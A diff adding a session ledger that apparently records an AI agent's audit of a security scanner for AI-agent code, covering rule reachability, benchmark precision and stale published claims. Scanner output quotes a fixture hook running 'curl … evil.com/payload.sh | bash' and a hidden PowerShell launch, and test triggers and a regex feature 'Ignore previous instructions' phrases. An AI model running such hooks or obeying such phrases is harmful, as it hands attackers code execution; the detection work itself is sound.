@@ -2152,3 +2152,647 @@ F1 0.9362** — verified at HEAD, output below in the invariants section. What i
 flagging is that `docs/BENCHMARK-RESULTS.md` puts an F1 of 0.909 in a headline position
 with the caveat in a block quote above it, and `results/avb_report.md` is an untracked
 artifact reporting a fourth combination.
+
+
+---
+
+# SESSION 5 (RUN5) — W19 through W22
+
+Target confidentiality maintained: the scanned third-party codebase is referred to only
+as "the audit target". No path, name or source excerpt appears here.
+
+## RUN5 opening measurement, before any change
+
+```
+$ ./run_eval.sh --commit e4a939d --verbose
+     50  (high   0)  AGENT-034 Shell Command Execution
+     11  (high  10)  AGENT-110 Source Map Leakage in Package
+      8  (high   0)  AGENT-026 Server-Side Request Forgery (SSRF)
+      7  (high   0)  AGENT-034 Dangerous Code Execution
+      5  (high   3)  AGENT-041 SQL Injection via Template String
+      5  (high   4)  AGENT-115 Agent Background Daemon Without Lifecycle Control
+      5  (high   0)  AGENT-010 Prompt Injection via Template String
+      4  (high   0)  AGENT-034 Tool Function Without Input Validation
+      4  (high   0)  AGENT-047 Subprocess Execution Without Sandbox
+      2  (high   0)  AGENT-004 Hardcoded Credentials
+      2  (high   2)  AGENT-110 Debug Artifact Not Excluded from Distribution
+      2  (high   0)  AGENT-045 Browser Automation Without Sandbox
+      1  (high   1)  AGENT-110 Missing .npmignore in npm Project
+      1  (high   0)  AGENT-020 Unencrypted or Unauthenticated Inter-Agent Channel
+
+{"recall_hit":0,"recall_total":6,"noise":87,"total":107,"commit":"e4a939d","python":"3.11.14"}
+```
+
+87 / 20 = 4.35:1, reproducing RUN4 exactly. **61 of the 87 are AGENT-034 from the
+TypeScript path** (50 Shell Command Execution + 7 Dangerous Code Execution + 4 Tool
+Function Without Input Validation — the last four are the Python path).
+
+---
+
+## W19 — Producer audit of every advertised rule
+
+### W19.1 Which rule count is canonical, and what the other numbers are counting
+
+RUN4 established 72 and this run confirms it, but "53 vs 72" understated the problem.
+**Seven different rule counts are published by this project.** They are not all wrong in
+the same way, and three of them are counting genuinely different things:
+
+| count | source | what it actually counts |
+|---|---|---|
+| 92 | `CLAUDE.md:56` (describing `engine.py`) | every ID in `RULE_CWE_MAPPING`, **including the 20 DeFi rules** that only run under `--profile defi` |
+| **72** | `README.md:28,272,287`; `docs/RULES.md` body | `RULE_CWE_MAPPING` minus DeFi. **Set-equal** to the IDs documented in `docs/RULES.md` — verified, not assumed |
+| 63 | `docs/RULES.md:1610` (its own footer) | stale; contradicts the body of the same file |
+| 53 | `packages/audit/pyproject.toml:4` — **the PyPI description** | unattributable to any set in the tree |
+| 52 | `rules/builtin/*.yaml` | unique rule IDs carrying a YAML definition |
+| 49 | `docs/index.html:7,10,896,1190,1207` (meta description, og:description, hero, pipeline diagram, section) | v0.16.0-era count, never updated |
+| 40 / 40+ | `docs/ARCHITECTURE.md:74,134,234`; `docs/ROADMAP.md:18`; `docs/README.md:12,199`; `README_CN.md:253` | v0.3-era count |
+
+Verification of the canonical pair:
+
+```
+$ python3 - (engine.py RULE_CWE_MAPPING vs docs/RULES.md)
+RULE_CWE_MAPPING: 92
+docs/RULES.md: 72
+engine-defi: 72
+docs-only: []
+engine-only: ['AGENT-090' ... 'AGENT-109']       # exactly the 20 DeFi rules
+```
+
+**72 is the canonical advertised set for a default scan.** 92 is the same set plus a
+profile the user must opt into; both are defensible if stated. 63, 53, 49 and 40 are
+simply stale — and 53 is the one that matters most, because it is the description PyPI
+shows every visitor.
+
+### W19.2 Method: runtime, not grep
+
+`results/w19_producer_audit.json`. Every one of the 72 advertised rules classified by
+running the real `run_scan()` over 122 probes — the 117-file fixture corpus plus five
+synthetic probes — laid out three directories below the scan root, then scanning each
+probe *file* and separately the *root directory*. Static search is used only to explain a
+zero, never to establish a one.
+
+```
+Counter({'LIVE': 52, 'UNREACHABLE': 14, 'YAML-ONLY': 5, 'NO-PRODUCER': 1})
+NO-PRODUCER (1): ['AGENT-003']
+YAML-ONLY   (5): ['AGENT-011', 'AGENT-013', 'AGENT-015', 'AGENT-016', 'AGENT-036']
+UNREACHABLE (14): ['AGENT-002', 'AGENT-027', 'AGENT-037', 'AGENT-038', 'AGENT-039',
+                   'AGENT-040', 'AGENT-042', 'AGENT-048', 'AGENT-052', 'AGENT-054',
+                   'AGENT-055', 'AGENT-056', 'AGENT-057', 'AGENT-120']
+```
+
+**The five YAML-ONLY rules are the sharpest result of this run.** RUN4 reported six rules
+with "no producer" and separately reported that `RuleEngine.evaluate()` has no runtime
+caller. Those are not two findings. Five of the six producerless rules **do** have their
+detection written out in full — `pattern_type`, indicators, regexes, config keys — inside
+`rules/builtin/*.yaml`, and the only code that could ever execute those blocks is
+`RuleEngine.evaluate()`. The detection was not "never written". It was written, in the
+place `CLAUDE.md` tells contributors to write it, into an evaluator nothing calls.
+
+Only **AGENT-003** is genuinely NO-PRODUCER: no YAML detection block, no `pattern_type`,
+no constructor. It survives solely as an allow-list key in `config/ignore.py`.
+
+### W19.3 The 14 UNREACHABLE, resolved by designed trigger
+
+"Never observed" is not "cannot fire". For each of the 14 I read the producer's own
+condition out of the source and built the input that condition asks for, then scanned it.
+Round 1 (`results/w19_designed_triggers.json`), round 2 after correcting six triggers that
+did not match the real condition (`results/w19_triggers_round2.json`):
+
+```
+AGENT-002          file=YES  dir=YES  | 18 @tool functions in one file
+AGENT-027          file=YES  dir=YES  | PromptTemplate(template="... {question}")
+AGENT-037          file=YES  dir=YES  | AgentExecutor(tools=[write_file_tool, shell_command_tool])
+AGENT-038          file=YES  dir=YES  | ChatPromptTemplate("Pretend you are a human ...")
+AGENT-039          file=YES  dir=YES  | Crew(agents=[researcher, writer])
+AGENT-040          file=YES  dir=YES  | inputSchema.additionalProperties: true
+AGENT-042          file=YES  dir=YES  | 14 mcpServers
+AGENT-048          file=YES  dir=YES  | extensions/myplugin importing '../../core'
+AGENT-052          file=YES  dir=YES  | logger.info("password=%s", password)
+AGENT-055          file=YES  dir=YES  | two servers exposing read_file
+AGENT-056          file=YES  dir=YES  | tool description "Ignore previous instructions ..."
+AGENT-057          file=YES  dir=YES  | arg description "Ignore previous instructions ..."
+AGENT-054          file=no   dir=no   | drift needs a stored baseline
+AGENT-120@root     file=no   dir=YES  | .claude/settings.json AT the scan root
+AGENT-120@nested   file=no   dir=no   | the same file ONE DIRECTORY BELOW the root
+```
+
+Twelve of the fourteen fire. **They are not unreachable; the probe corpus has no fixture
+for them.** That absence is the result: twelve advertised rules have no test input
+anywhere in this repository, so nothing but a hand-built trigger has ever demonstrated
+they work. Recorded as a corpus gap, not fixed — fixtures are not mine to add.
+
+**Two corrections to RUN4 fall out of this.**
+
+RUN4's DECISIONS item 29 and `KNOWN_UNREACHABLE_MECHANISMS` both state that AGENT-056 and
+AGENT-057 "cannot fire from a static config" because `mcp_config_scanner._detect_tool_poisoning`
+has zero callers. That method does have zero callers — but it is not the producer.
+`_check_tool_poisoning_in_config` is a **different method**, it is called from
+`mcp_config_scanner.py:570` on every config scan, and it emits both rules. Verified above.
+RUN4's designed trigger missed it for a reason worth keeping: the phrase it used was
+`"Ignore all previous instructions"`, and the analyzer's regex is
+`ignore\s+(previous|all|above|prior)\s+(instructions?|rules?|constraints?)` — which
+requires the noun immediately after the first qualifier, so it matches "ignore previous
+instructions" and **not** the far more common "ignore all previous instructions". The
+rule is alive; its most-cited trigger phrase is a blind spot. Both facts logged.
+
+**AGENT-054 is unreachable from `scan` by design, not by defect.** `MCPBaselineManager` is
+constructed only in `cli/commands/inspect.py:198`. Drift detection compares a live server
+against a stored baseline; there is no static input that can produce it. It is advertised
+in `docs/RULES.md` alongside 71 rules that a directory scan does reach, with nothing
+saying so.
+
+### W19.4 AGENT-120 is the sixth instance of this run's defect shape — and it is new
+
+`package_scanner._scan_ai_tool_hooks` resolves its targets as `path / config_rel` for each
+entry in `_AI_TOOL_CONFIG_PATHS` (`.claude/settings.json`, `.cursor/settings.json`, …).
+That is a direct join against the scan root. There is no `rglob`.
+
+The consequence, measured above: a `.claude/settings.json` carrying a
+`curl … | bash` hook is reported when the scan root **is** its parent, and is silent when
+that parent sits one directory below the scan root. Scanning a monorepo, or any directory
+above the project, cannot find it.
+
+This is `f649dcc` again — the non-recursive `iterdir()` in the MCP config scanner — in a
+rule that shipped in v0.19.0, five months later. It is the sixth instance of the pattern
+across three runs.
+
+**The reachability guard could not catch it, and the reason matters.**
+`test_no_rule_is_reachable_only_by_file_argument` fires on `file > 0 and dir == 0`. For
+AGENT-120 the file count is *also* zero — the rule needs a directory, not a file — and
+there is no `.claude/settings.json` probe in the corpus. Both counts zero reads as
+"orphan", and AGENT-120 is not in the orphan set either because it has a producer. It fell
+through the exact seam between the two tests. Fixed and guarded in W19.6.
+
+### W19.5 AGENT-015 — diagnosis
+
+Three separate things are called AGENT-015 in this repository.
+
+**As published** (`docs/RULES.md:478`, `rules/builtin/owasp_agentic_v2.yaml`): "Untrusted
+MCP Server Source", CRITICAL, CWE-494, ASI-04. Its YAML detection keys on config keys
+`mcpServers`/`servers`, `npx` without a pinned version, `@latest`, and `http://` sources.
+
+**As implemented**: it is not. Its two pattern types, `npx_unfixed_version` and
+`unofficial_mcp_source`, are emitted by no scanner. Its detection lives entirely in the
+YAML block that only `RuleEngine.evaluate()` could execute.
+
+**AGENT-030 already is that rule.** "Unverified MCP Server Source", CRITICAL, CWE-494,
+ASI-04, `docs/RULES.md:898`: "MCP server loaded from npm without version pinning or uses
+HTTP instead of HTTPS." Same severity, same CWE, same OWASP category, same detection
+content, near-identical title — and AGENT-030 has a real producer in
+`mcp_config_scanner.py` and fires on the corpus. AGENT-015 (from `owasp_agentic_v2.yaml`,
+the v0.2-era file) was reimplemented as AGENT-030 in `mcp_security_v030.yaml` at v0.3.0
+and never withdrawn.
+
+**As labelled, it is a third rule entirely.** The five corpus labels citing AGENT-015 —
+`tests/ground_truth/labeled_samples.yaml:1669,1679,1689,1699,1709` — are:
+
+| labelled file | line | the label's own note |
+|---|---|---|
+| `asi-04-supply-chain/direct/npm_install_runtime.py` | 13 | "Runtime npm install without verification" |
+| `asi-04-supply-chain/direct/curl_pipe_bash.sh` | 11 | "Curl pipe to bash - arbitrary code execution" |
+| `asi-04-supply-chain/direct/git_clone_exec.py` | 14 | "Git clone and execute untrusted repo" |
+| `asi-04-supply-chain/indirect/dynamic_requirements.py` | 14 | "Install from remote requirements file" |
+| `asi-04-supply-chain/indirect/pypi_typosquatting.py` | 12 | "PyPI typosquatting" |
+
+**Not one of them involves an MCP server.** The AVB taxonomy agrees with the labels and
+not with the title: `tests/benchmark/agent-vuln-bench/taxonomy/owasp_agentic_mapping.yaml:32`
+lists AGENT-015 with the comment `# unverified_tool_source`.
+
+**Why this matters numerically.** Layer 1 matches on `file:line:rule_id`
+(`precision_recall.py:49,64`), with a 3-line tolerance — the *rule ID is part of the key*.
+A label citing a rule that cannot be produced is therefore an unmatchable label: a
+guaranteed false negative at every commit, on every input, forever. Five of them.
+
+What the tool actually emits at those five lines, measured:
+
+```
+npm_install_runtime.py   line 13  -> AGENT-001 Command Injection via Unsanitized Input  (exact line)
+curl_pipe_bash.sh        line 11  -> NOTHING
+git_clone_exec.py        line 14  -> AGENT-034 Tool Function Without Input Validation   (exact line)
+dynamic_requirements.py  line 14  -> NOTHING
+pypi_typosquatting.py    line 12  -> AGENT-034 at line 14                               (within tolerance)
+```
+
+**Three of the five vulnerabilities are detected, at the labelled line, under a different
+rule ID** — and are scored as a false negative *and* a false positive simultaneously,
+because the ID does not match. Two are genuine misses.
+
+So the label mismatch and the missing producer are the same underlying confusion, and the
+mechanism is now explicit: **a rule that never fires can be labelled to mean anything,
+because no output ever contradicts the label.** AGENT-015 drifted from "untrusted MCP
+source" to "untrusted code fetched at runtime" precisely because nothing was ever emitted
+under it to anchor the meaning.
+
+Per the brief I diagnose and do not resolve: **no ground-truth label was touched.** The
+resolution is Heady's, and the two coherent options are recorded in DECISIONS.
+
+### W19.6 The guard, proved failing before and passing after
+
+`tests/test_rule_producers.py`. No allow-list anywhere in it: an advertised rule with no
+producer fails, full stop.
+
+**On HEAD (`e4a939d`), before any fix — three intended failures:**
+
+```
+$ PYTHONHASHSEED=0 python3 -m pytest tests/test_rule_producers.py -q --tb=line
+E   AssertionError: advertised rules that no code path can construct — they cannot fire on
+    any input at any commit: ['AGENT-003', 'AGENT-011', 'AGENT-013', 'AGENT-015',
+    'AGENT-016', 'AGENT-036']
+E   AssertionError: rules whose only detection is a YAML `detection.patterns` block,
+    evaluated solely by the uncalled RuleEngine.evaluate(): ['AGENT-011', 'AGENT-013',
+    'AGENT-015', 'AGENT-016', 'AGENT-036']
+E   AssertionError: AGENT-120 did not fire when .claude/settings.json sat three
+    directories below the scan root; hook discovery is not recursive
+FAILED tests/test_rule_producers.py::test_no_advertised_rule_is_without_a_producer
+FAILED tests/test_rule_producers.py::test_no_advertised_rule_has_its_detection_only_in_yaml
+FAILED tests/test_rule_producers.py::test_ai_tool_hook_config_is_found_below_the_scan_root
+3 failed, 5 passed
+```
+
+**After `d4d2850` (AGENT-120 recursion) and `6adedd1` (withdrawal):**
+
+```
+$ PYTHONHASHSEED=0 python3 -m pytest tests/test_rule_reachability.py tests/test_rule_producers.py -q
+13 passed, 810 warnings in 7.49s
+```
+
+An intermediate run is worth keeping because it corrected the test rather than the code:
+`test_scan_unreachable_registry_names_a_real_command_boundary` first failed claiming
+AGENT-054 was produced from the scan path, on the strength of `cli/commands/scan.py`
+containing the strings `mcp_tool_drift_added` and friends. Those are keys in a
+category-lookup table and produce nothing. The test was rewritten to decide the question
+by running a scan against a config plus a baseline file, which is the only way to settle
+it. Recorded because it is the exact error the brief warns about: *static search tells you
+a string exists; it does not tell you a finding can be produced.*
+
+### W19.7 Disposition, per rule, and the measured cost
+
+**AGENT-120 — fixed.** `d4d2850`. `_scan_ai_tool_hooks` and `_scan_mcp_json_commands` both
+discover with `rglob` + `_should_skip` now, like the nine other discovery paths.
+
+**Six rules — withdrawn, not implemented.** `6adedd1`. 72 → 66. Each carries its reason in
+`WITHDRAWN_RULES` in `rules/engine.py` and in a new Withdrawn Rules section of
+`docs/RULES.md`, which also records the coverage gaps that withdrawal leaves (exfiltration
+chains, goal boundaries, RAG provenance, tool-output trust are real ASI risks this tool
+does not detect) and the two that are genuinely covered elsewhere (AGENT-013 → AGENT-004,
+AGENT-015 → AGENT-030).
+
+Withdrawal over implementation for all six, per the brief's preference where semantics are
+unclear. Four state no operational threshold at all — "lacks explicit goal boundaries",
+"without integrity validation" — so a producer would encode a guess, and a rule
+implemented from a guess is worse than an absent one. Two are duplicates of rules that
+already work. None of the six is "small and unambiguous".
+
+**Measured cost of the two commits.**
+
+| | noise | high | Layer 1 TP | FP | FN | precision |
+|---|---|---|---|---|---|---|
+| `e4a939d` start | 87 | 20 | 196 | 90 | 40 | 0.6853 |
+| `d4d2850` AGENT-120 recursion | 87 | 20 | — | — | — | — |
+| `6adedd1` withdrawal | **87** | **20** | **196** | **93** | **40** | **0.6782** |
+
+```
+$ ./run_eval.sh --commit d4d2850
+{"recall_hit":0,"recall_total":6,"noise":87,"total":107,"commit":"d4d2850","python":"3.11.14"}
+$ ./run_eval.sh --commit 6adedd1
+{"recall_hit":0,"recall_total":6,"noise":87,"total":107,"commit":"6adedd1","python":"3.11.14"}
+```
+
+Noise unchanged, high-value unchanged, recall unchanged. **Layer 1 false positives rose by
+three, precision 0.6853 → 0.6782.** Itemised rather than absorbed — all three come from
+the AGENT-120 fix, none from the withdrawal (a rule that never fired cannot change a
+count):
+
+```
+AGENT-120  agent_architecture/vulnerable_hooks/.claude/settings.json:6   BLOCK 0.95
+           powershell -WindowStyle Hidden -Command "Start-Process notepad"
+AGENT-120  agent_architecture/vulnerable_hooks/.claude/settings.json:12  WARN  0.90
+           curl -s https://evil.com/payload.sh | bash
+AGENT-120  agent_architecture/vulnerable_hooks/.mcp.json:4               WARN  0.90
+           curl -s https://evil.com/payload.sh | bash
+```
+
+**All three are true positives by the rule's own definition, and the fixture is named
+`vulnerable_hooks`.** Somebody wrote a fixture for AGENT-120 containing a hidden-window
+PowerShell launch and a `curl | bash` hook — and the rule could never see it, because the
+scan root is `tests/fixtures` and the config sits two directories below. The fixture
+existed, the rule existed, and the root-join meant they never met.
+
+The corpus does not label them: `grep` over `labeled_samples.yaml` finds **no label
+anywhere citing AGENT-120 or `vulnerable_hooks`**, across 81 labelled files. AGENT-120
+shipped in v0.19.0 with zero ground-truth coverage.
+
+This is W16's finding repeating exactly: precision falls because the tool starts finding
+things the corpus never labelled. **I did not add the labels** — logged for Heady with the
+W16 additions.
+
+Quality gate on a freshly generated `results/layer1.json`:
+
+```
+$ PYTHONHASHSEED=0 python3 tests/benchmark/quality_gate_check.py
+  config: tests/benchmark/gates.yaml
+  ℹ️ [INFO] Layer 1 precision 67.8% below target 90% (aspirational, non-blocking)
+  ℹ️ [INFO] Layer 1 recall 83.1% below target 85% (aspirational, non-blocking)
+  ℹ️ [INFO] Layer 1 F1 74.7% below target 87% (aspirational, non-blocking)
+Summary: 0 failures, 0 warnings, 0 skipped, 3 below target (non-blocking)
+GATE EXIT=0
+```
+
+0.6782 clears the 0.66 ratchet floor. **The ratchet was not touched.** `results/layer1.json`
+was regenerated in place (it read FP 91 / P 0.6829 — the W12 measurement, DECISIONS 28).
+
+Full suite: **1741 passed, 1 skipped**, against RUN4's 1731 — exactly the 10 tests added
+(8 producer, 2 CWE-mapping). Nothing deleted, nothing skipped.
+
+### W19.8 Final classification of all 72 formerly-advertised rules
+
+| class | n | rules |
+|---|---|---|
+| **LIVE** — producer exists, observed firing on a real scan | 52 | the 52 the probe corpus reaches |
+| **LIVE, no fixture** — producer exists, fires on a designed trigger, no test input in the repo | 12 | 002, 027, 037, 038, 039, 040, 042, 048, 052, 055, 056, 057 |
+| **LIVE, wrong-command-only** — reachable only via `inspect` | 1 | 054 |
+| **LIVE after this run** — was unreachable below the scan root | 1 | 120 |
+| **WITHDRAWN** — no producer; five of them YAML-only | 6 | 003, 011, 013, 015, 016, 036 |
+
+**66 advertised, and every one of the 66 now has a producer and a demonstration that it
+fires.** 12 of the 66 have that demonstration only from a hand-built trigger recorded in
+this ledger, not from a fixture in the repository. That gap is a corpus gap, and adding
+fixtures is not mine to do.
+
+---
+
+## W20 — Wiring the TypeScript tool-boundary gate
+
+### The wiring
+
+`_apply_tool_boundary_gate` in `typescript_scanner.py`, applied once per file in
+`_scan_file` after both the tree-sitter and the regex paths, so the two cannot diverge.
+Only `TOOL_SCOPED_RULES = {"AGENT-034"}` is affected. **Membership only** — the detector's
+`get_tool_confidence_boost` is deliberately unused, so no confidence value moves anywhere.
+No threshold or tier boundary was touched.
+
+### Effect on the audit target
+
+```
+$ ./run_eval.sh --commit 6adedd1        (before)
+{"recall_hit":0,"recall_total":6,"noise":87,"total":107,...}
+$ ./run_eval.sh --commit 2ee8345        (after)
+{"recall_hit":0,"recall_total":6,"noise":44,"total":64,...}
+```
+
+**87 → 44 noise, high-value 20 unchanged, recall 0/6 unchanged. Ratio 4.35:1 → 2.2:1.**
+
+Per-rule, after:
+
+```
+     18  (high   0)  AGENT-047 Subprocess Execution Without Sandbox
+     11  (high  10)  AGENT-110 Source Map Leakage in Package
+      8  (high   0)  AGENT-026 Server-Side Request Forgery (SSRF)
+      5  (high   3)  AGENT-041 SQL Injection via Template String
+      5  (high   4)  AGENT-115 Agent Background Daemon Without Lifecycle Control
+      5  (high   0)  AGENT-010 Prompt Injection via Template String
+      4  (high   0)  AGENT-034 Tool Function Without Input Validation
+      2  (high   0)  AGENT-004 Hardcoded Credentials
+      2  (high   2)  AGENT-110 Debug Artifact Not Excluded from Distribution
+      2  (high   0)  AGENT-045 Browser Automation Without Sandbox
+      1  (high   1)  AGENT-110 Missing .npmignore in npm Project
+      1  (high   0)  AGENT-020 Unencrypted or Unauthenticated Inter-Agent Channel
+```
+
+The four remaining AGENT-034 are the Python path, which was always gated.
+
+### Effect on the benchmarks — the question the brief asked
+
+```
+Layer 1, before (6adedd1) : TP 196  FP 93  FN 40   P 67.82%  R 83.05%  F1 74.67%
+Layer 1, after  (2ee8345) : TP 196  FP 93  FN 40   P 67.82%  R 83.05%  F1 74.67%
+
+AVB knowns, after: Recall 100.0%  Precision 88.0%  F1 0.9362
+                   Set A 100.0%  Set B 100.0%  Set C 100.0%
+```
+
+**Not one true positive is suppressed on either benchmark, and not one false positive is
+removed from either.** Both corpora are overwhelmingly Python; the gate touches only the
+TypeScript path, so the ungated years never showed up in a published precision figure
+either. That is itself the finding: the rule's TypeScript emission has never been in the
+denominator of any number this project publishes.
+
+### Itemising the 57 removed findings — not absorbed into a total
+
+Diffed finding-by-finding on `(rule_id, file, line, title)` from the harness's own scan
+JSON at both commits. 107 → 64: **57 removed, 14 added.**
+
+```
+REMOVED by rule/title:
+     7  AGENT-034  Dangerous Code Execution
+    50  AGENT-034  Shell Command Execution
+ADDED by rule/title:
+    14  AGENT-047  Subprocess Execution Without Sandbox
+AGENT-047 findings added on a line that previously carried AGENT-034: 14
+```
+
+Split by whether the line still carries any finding at all:
+
+```
+     7  Dangerous Code Execution     -> line now silent
+    36  Shell Command Execution      -> line now silent
+    14  Shell Command Execution      -> line still reported (as AGENT-047)
+```
+
+The 14 are a **re-labelling, not a loss**: `RULE_SUBSUMPTION_MAP` had `AGENT-034:
+[AGENT-047]` from RUN4, so AGENT-047 was being suppressed on those same lines. With
+AGENT-034 gated out, the rule actually titled "Subprocess Execution Without Sandbox"
+surfaces — which for shell execution outside a tool handler is the better-named rule.
+
+The 43 that go silent, by the call they named:
+
+```
+    36 shell-execution shapes: spawnSync x28, spawn x4, execa x2, execFile x2
+     7 code-execution shapes : vm.runInNewContext x3, new Function x3, eval x1
+```
+
+Tier of the removed set: **WARN 56, BLOCK 1.**
+
+### The one finding that needs its own justification, and I cannot give it one
+
+```
+AGENT-034  Dangerous Code Execution   tier=BLOCK  confidence=0.95  severity=critical
+           return eval(expr)
+           still a finding on that line? False
+```
+
+`eval`, `new Function` and `vm.runInNewContext` are dangerous whether or not they sit
+inside a tool handler. AGENT-034's tool-boundary constraint comes from its definition as
+"Tool Function Without Input Validation" — a rule about unvalidated *tool input*. It does
+not follow that dynamic code execution stops mattering outside a tool, and on the Python
+side that shape is reported under **AGENT-017 "Unsandboxed Code Execution"**, which has no
+tool gate at all.
+
+Narrowing `TOOL_SCOPED_RULES` to the shell-execution pattern types and leaving
+`ts_eval_exec` ungated is a one-line change that returns all seven. **I did not make it.**
+Which pattern types belong inside the gate *is* the gate's semantics, and the brief says
+semantics are Heady's decision, not a nudge I make to avoid collateral damage. DECISIONS 30,
+with the three options and a recommendation.
+
+### The 43 tests that encoded the old contract
+
+`tests/test_typescript_scanner.py` had 43 failures the moment the gate landed — DECISIONS 25
+predicted "a dozen". Every one of them writes a bare snippet and asserts AGENT-034 fires.
+
+They were **not** inverted and **not** deleted. Their subject is call-shape recognition —
+`fetch` receiver resolution, constant-argument suppression, the fixed-non-shell-program
+predicate — all of it RUN4 denoise work whose coverage inverting would have destroyed. The
+module's `_write_ts_file` now wraps its content in a real MCP tool handler
+(`server.tool(name, schema, handler)`, the detector's highest-confidence pattern), and
+`_write_bare_ts_file` writes a file with no tool entry point for tests about the gate.
+
+The suppression tests moved inside the boundary too, which matters more than it looks: left
+on bare files they would still pass, but **vacuously** — the gate would suppress the finding
+whatever the predicate did.
+
+### Proof of the contract, both directions
+
+`TestToolBoundaryGate`, the pair the brief asked for — same `spawnSync(userCommand,
+userArgs)`, inside and outside:
+
+```
+test_dangerous_call_outside_any_tool_entry_point_is_not_reported   PASS
+test_the_same_call_inside_a_tool_entry_point_is_reported           PASS
+test_other_recognised_frameworks_also_open_a_boundary[vercel-ai]   PASS
+test_other_recognised_frameworks_also_open_a_boundary[langchain-js] PASS
+test_other_recognised_frameworks_also_open_a_boundary[express]     PASS
+test_rules_that_are_not_tool_scoped_are_untouched                  PASS
+test_a_call_below_the_handler_scope_is_outside_the_boundary        PASS
+
+$ pytest tests/test_typescript_scanner.py -q
+140 passed
+```
+
+The last one is the non-trivial control: a file that *does* contain a `server.tool(...)`
+handler, with the dangerous call in a separate function below it. The boundary is a scope,
+not a file, so the call is still outside.
+
+---
+
+## W21 — `RuleEngine.evaluate()`: measured, then reverted
+
+### What the code actually does, which settles it before the measurement
+
+`_evaluate_rule` dispatches on `pattern.get('type')` and implements exactly three branches:
+`python_ast`, `function_call`, `regex`. Across the 52 builtin YAML rules:
+
+```
+total pattern entries: 84
+values of the 'type' key the evaluator dispatches on:
+  {'<MISSING>': 81, 'python_ast': 1, 'function_call': 1, 'regex': 1}
+```
+
+**81 of 84 pattern entries have no `type` key.** They use `pattern_type`, which the
+evaluator never reads, alongside about seventy bespoke keys — `indicators`,
+`missing_guards`, `chained_to`, `command_patterns`, `context_near` — that nothing parses.
+The three dispatchable entries belong to AGENT-001 (two) and AGENT-004 (one).
+
+So "wire it or retire it" is not a choice between a dormant mechanism and a document. The
+evaluator does not parse the dialect the rules are written in. Wiring turns on 3 of 84
+blocks; making the other 81 work is implementing 49 rules from unvalidated specifications.
+
+### The measurement anyway
+
+Scratch commit `3f52f90`, wiring behind `AGENT_AUDIT_WIRE_YAML_RULES=1` in `scan.py`.
+Flag off vs. on **at the same commit**, so the only variable is the wiring:
+
+```
+Layer 1, flag OFF               Layer 1, flag ON
+  True Positives:  196            True Positives:  197
+  False Positives: 93             False Positives: 115
+  False Negatives: 40             False Negatives: 44
+  Precision: 67.82%               Precision: 63.14%
+  Recall:    83.05%               Recall:    81.74%
+  F1-Score:  74.67%               F1-Score:  71.25%
+
+$ ./run_eval.sh --commit 3f52f90                 -> noise 44
+$ AGENT_AUDIT_WIRE_YAML_RULES=1 ./run_eval.sh --commit 3f52f90  -> noise 45
+```
+
+Fixture-corpus finding delta, 291 → 314 (+23):
+
+```
+   AGENT-001: 17 -> 52     (+35)
+   AGENT-004: 11 -> 12     (+1)
+   AGENT-034: 25 -> 17     (-8)
+   AGENT-047: 5  -> 0      (-5)
+```
+
+**Wiring loses four true positives.** The +35 AGENT-001 findings mostly duplicate lines
+already covered; dedup and subsumption then remove the AGENT-034 and AGENT-047 findings
+that *were* matching labels. A rule engine that reduces recall is an unusual result and it
+is the reason the recommendation is unambiguous.
+
+**Reverted in `25636c3`.** `grep -c AGENT_AUDIT_WIRE_YAML_RULES scan.py` → `0`.
+Recommendation in DECISIONS 32: **retire**, and fix the `CLAUDE.md` checklist either way,
+because that checklist is what manufactured five of the six rules W19 withdrew.
+
+---
+
+## W22 — Public-claim reconciliation
+
+Full document at `CLAIMS_RECONCILIATION.md`. **Nothing public-facing was edited.** Two
+results worth repeating here.
+
+### The 98.51% is not a stale measurement — it is not a measurement
+
+`git log -S "98.51" -- tests/README.md` returns one commit, `a65b341` (v0.5.2,
+2026-02-04). The `results/layer1.json` committed **in that same commit** reads:
+
+```
+  "true_positives": 112,  "false_positives": 4,  "false_negatives": 124,
+  "precision": 0.9655172413793104,
+  "recall": 0.4745762711864407,
+  "f1_score": 0.6363636363636365,
+```
+
+P 96.55% / R 47.46% / F1 0.6364 — neither figure matches the README's 98.51 / 100 / 99.25.
+The number was never produced by the script whose output sits beside it.
+
+Where it comes from: `tests/README.md` gives the corpus as 198 annotations and names three
+residual false positives. Take TP = 198, FP = 3, **FN = 0**:
+
+```
+$ python3 -c "tp,fp=198,3; p=tp/(tp+fp); r=1.0; print(p, r, 2*p*r/(p+r), fp/(tp+fp))"
+P = 98.5075%   R = 100.00%   F1 = 99.2481%   FP rate = 1.49%
+```
+
+All four published figures to four decimal places. **False negatives were assumed to be
+zero rather than measured**; recall was set to 100% by construction. The same commit
+measured FN = 124. `CHANGELOG.md:175-177` then carries it forward as "98.51% → 100%".
+
+This is why it needed tracing rather than updating: rows 2–9 of the claims table are stale
+measurements that a re-run corrects, and this one no re-run can reproduce.
+
+### Eight rule counts
+
+66 (this run) · 72 (README) · 92 (CLAUDE.md) · 63 (RULES.md's own former footer) ·
+**53 (PyPI description)** · 52 (YAML files) · 49 (docs/index.html) · 40+ (ARCHITECTURE,
+ROADMAP, docs/README, README_CN). Three measure something real — 66 for a default scan, 86
+including `--profile defi`, 52 YAML definitions. The rest are stale, and 53 is
+unattributable to any set at any commit I could find. It is also the only rule count on a
+distribution surface.
+
+### A red CI gate, found while sweeping
+
+`tests/benchmark/precision_recall.py:503` ends `if result.f1_score < 0.75: sys.exit(1)`,
+and `.github/workflows/benchmark.yml:33` runs it with `continue-on-error` deliberately
+removed. Current F1 is 0.7467.
+
+```
+$ PYTHONHASHSEED=0 python3 tests/benchmark/precision_recall.py > /dev/null; echo $?
+1
+```
+
+Meanwhile `gates.yaml` — whose header calls it "THE SINGLE SOURCE OF TRUTH" and describes
+deleting the inline workflow gate because two gates on one layer hid a contradiction for
+six months — carries `f1_min: 0.72`, and `quality_gate_check.py` exits 0. The inline gate
+was deleted; this hard-coded floor inside the script was not. Before this run F1 was
+0.7510, one thousandth above it.
+
+**Neither threshold was touched.** DECISIONS 31.
